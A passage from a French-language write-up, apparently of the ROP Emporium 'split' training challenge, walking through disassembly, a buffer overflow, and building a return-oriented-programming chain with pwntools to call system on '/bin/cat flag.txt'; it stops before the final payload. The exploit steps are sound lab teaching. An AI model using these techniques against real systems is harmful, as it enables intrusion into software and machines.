</span></span></code></pre></div><p>Cette fois-ci, <strong>NX</strong> est activ√©, ce qui veut dire qu&rsquo;on ne pourra pas utiliser de shellcode.</p>
<h2 id="exploitation-1">
  Exploitation
  <a href="#exploitation-1" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>On va run l&rsquo;executable et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png" alt="2023-01-14-140834_657x666_scrot"></p>
<p>Contrairement au pr√©c√©dent, il ne nous donne aucune information sur son fonctionnement. En revanche, on voit que si on entre un nombre de bytes √©lev√© dans l&rsquo;input, il  <code>segfault</code>, ce qui veut dire qu&rsquo;on a commenc√© √† r√©ecrire la sauvegarde de <code>rip</code></p>
<p>C&rsquo;est bon signe, on a d√©j√† trouv√© notre point d&rsquo;entr√©e. On va maintenant d√©sassembler l&rsquo;executable avec <code>pwndbg</code> pour essayer de comprendre plus en d√©tail ce qu&rsquo;il fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400697</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400698</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2009d6</span>]        <span style="color:#75715e"># 0x601078 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4005a0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4007e8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4007fe</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006e8</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400806</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006dc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit que le main fait appel √† une fonction appel√©e <code>pwnme</code>, on va la d√©sassembler elle aussi et voir ce qu&rsquo;elle fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400701</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400580</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400706</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400810</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040070b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400710</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x40083c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400715</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400570</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400735</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x40083f</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400740</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:	leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400741</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On peut voir qu&rsquo;il lit 96 (0x60) bytes d&rsquo;input via la fonction <code>read()</code>, et qu&rsquo;il les stocke dans un buffer de 32 (0x20) bytes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Voici donc √† quoi va ressembler le d√©but de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(padding <span style="color:#f92672">+</span> rbp)
</span></span></code></pre></div><p>Evidemment, cet exploit ne fait rien, mais nous savons d√©j√† quelle taille notre padding va faire, et on peut √† pr√©sent r√©ecrire la sauvegarde de <code>rip</code>. La prochaine √©tape est de savoir quoi mettre dans ce registre, on va commencer par chercher si il y a des fonctions int√©ressantes (toujours avec <code>pwndbg</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400742</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d4</span>  _fini
</span></span></code></pre></div><p>On voit une fonction <code>usefulFunction</code> situ√©e √† <code>0x00400742</code>. Voyons ce qu&rsquo;elle fait en la d√©sassemblant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass usefulFunction
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function usefulFunction:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400742</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400743</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400746</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040074b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400750</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400751</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400752</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Elle fait donc appel √† <code>system</code>, en lui passant un argument situ√© √† l&rsquo;adresse <code>0x40084a</code>, voyons voir √† quoi elle correspond</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x40084a</span>:	<span style="color:#e6db74">&#34;/bin/ls&#34;</span>
</span></span></code></pre></div><p>Cette fonction va donc √©xecuter la commande <code>ls</code> via <code>system</code>, pas tr√®s utile&hellip; En revanche, on va pouvoir utiliser l&rsquo;adresse de l&rsquo;appel de la fonction <code>system</code> plus tard, alors gardons la de c√¥t√© (<code>0x0040074b</code>)</p>
<p>Maintenant qu&rsquo;on va pouvoir appeller system, il faut trouver un string qu&rsquo;on va lui donner en argument, de pr√©f√©rence soit un <code>/bin/sh</code> pour avoir un shell, ou un <code>/bin/cat flag.txt</code> pour directement lire le flag. Regardons la liste des strings de l&rsquo;executable</p>
<pre tabindex="0"><code>strings -t x split                                                                                                      ÓÇ∫ ‚úî ‚ï± took 6s Ôâí ‚ï± at 15:21:31 ÔÄó ÓÇº
    238 /lib64/ld-linux-x86-64.so.2
    3b1 libc.so.6
    3bb puts
    3c0 printf
    3c7 memset
    3ce read
    3d3 stdout
    3da system
    3e1 setvbuf
    3e9 __libc_start_main
    3fb GLIBC_2.2.5
    407 __gmon_start__
    760 AWAVI
    767 AUATL
    7ba []A\A]A^A_
    7e8 split by ROP Emporium
    7fe x86_64
    807 Exiting
    810 Contriving a reason to ask user for data...
    83f Thank you!
    84a /bin/ls
    917 ;*3$&#34;
   1060 /bin/cat flag.txt
   1072 GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
   1731 crtstuff.c
   173c deregister_tm_clones
   1751 __do_global_dtors_aux
   1767 completed.7698
   1776 __do_global_dtors_aux_fini_array_entry
   179d frame_dummy
   17a9 __frame_dummy_init_array_entry
   17c8 split.c
   17d0 pwnme
   17d6 usefulFunction
   17e5 __FRAME_END__
   17f3 __init_array_end
   1804 _DYNAMIC
   180d __init_array_start
   1820 __GNU_EH_FRAME_HDR
   1833 _GLOBAL_OFFSET_TABLE_
   1849 __libc_csu_fini
   1859 stdout@@GLIBC_2.2.5
   186d puts@@GLIBC_2.2.5
   187f _edata
   1886 system@@GLIBC_2.2.5
   189a printf@@GLIBC_2.2.5
   18ae memset@@GLIBC_2.2.5
   18c2 read@@GLIBC_2.2.5
   18d4 __libc_start_main@@GLIBC_2.2.5
   18f3 __data_start
   1900 __gmon_start__
   190f __dso_handle
   191c _IO_stdin_used
   192b usefulString
   1938 __libc_csu_init
   1948 _dl_relocate_static_pie
   1960 __bss_start
   196c main
   1971 setvbuf@@GLIBC_2.2.5
   1986 __TMC_END__
   1993 .symtab
   199b .strtab
   19a3 .shstrtab
   19ad .interp
   19b5 .note.ABI-tag
   19c3 .note.gnu.build-id
   19d6 .gnu.hash
   19e0 .dynsym
   19e8 .dynstr
   19f0 .gnu.version
   19fd .gnu.version_r
   1a0c .rela.dyn
   1a16 .rela.plt
   1a20 .init
   1a26 .text
   1a2c .fini
   1a32 .rodata
   1a3a .eh_frame_hdr
   1a48 .eh_frame
   1a52 .init_array
   1a5e .fini_array
   1a6a .dynamic
   1a73 .got
   1a78 .got.plt
   1a81 .data
   1a87 .bss
   1a8c .comment
</code></pre><p>On voit un <code>/bin/cat flag.txt</code> situ√© √† l&rsquo;offset <code>1060</code>. C&rsquo;est le string qu&rsquo;on va passer comme argument √† <code>system</code>, mais pour √ßa, il va nous falloir son adresse. Puisque c&rsquo;est un string, il est situ√© dans la section <code>.data</code>. Essayons de trouver o√π elle se situe avec <code>pwndbg</code>. Pour ce faire, on peut utiliser la commande <code>readelf</code>, puis grep <code>.data</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>s split <span style="color:#f92672">|</span> grep <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">00000000004007e0</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">15</span> <span style="color:#f92672">.</span>rodata
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">23</span> <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">47</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  WEAK   DEFAULT   <span style="color:#ae81ff">23</span> data_start
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">49</span>: <span style="color:#ae81ff">0000000000601072</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> _edata
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">56</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> __data_start
</span></span></code></pre></div><p>On voit que le d√©but de notre section <code>.data</code> se trouve √† l&rsquo;adresse <code>0x601050</code>. Notre offset pour <code>/bin/cat flag.txt</code> √©tait <code>1060</code>, donc son adresse est <code>0x600000+0x1060</code> soit <code>0x601060</code></p>
<p>On peut v√©rifier que cette adresse est correcte avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x601060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x601060</span> <span style="color:#f92672">&lt;</span>usefulString<span style="color:#f92672">&gt;</span>:	<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Parfait, c&rsquo;est bien l&rsquo;adresse de notre <code>/bin/cat flag.txt</code>.</p>
<p>Il nous manque √† pr√©sent une derni√®re chose: un gadget <code>pop rdi; ret</code>.</p>
<blockquote>
<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va √™tre appel√©e, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p>
</blockquote>
<p>Pour trouver ce gadget, on peut utiliser <code>ROPGadget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary split <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007c3</span> : pop rdi ; ret
</span></span></code></pre></div><p>Maintenant qu&rsquo;on a notre gadget, r√©capitulons:</p>
<ul>
<li>Avec un padding de 40 bytes, on commence √† r√©ecrire la sauvegarde de <code>rip</code> (instruction pointer)</li>
<li>On peut mettre un pointeur vers <code>/bin/cat flag.txt</code>  dans <code>rdi</code> gr√¢ce √† notre gadget <code>pop rdi; ret</code></li>
<li>On peut appeller la fonction <code>system</code> depuis son adresse puisque la protection <code>PIE</code> n&rsquo;est pas activ√©e</li>
</ul>
<blockquote>
<p>Si PIE avait √©t√© activ√©, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait chang√© entre chaque ex√©cution</p>
</blockquote>
<h2 id="final-payload-1">
  Final Payload
  <a href="#final-payload-1" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Compl√©tons notre exploit</p>
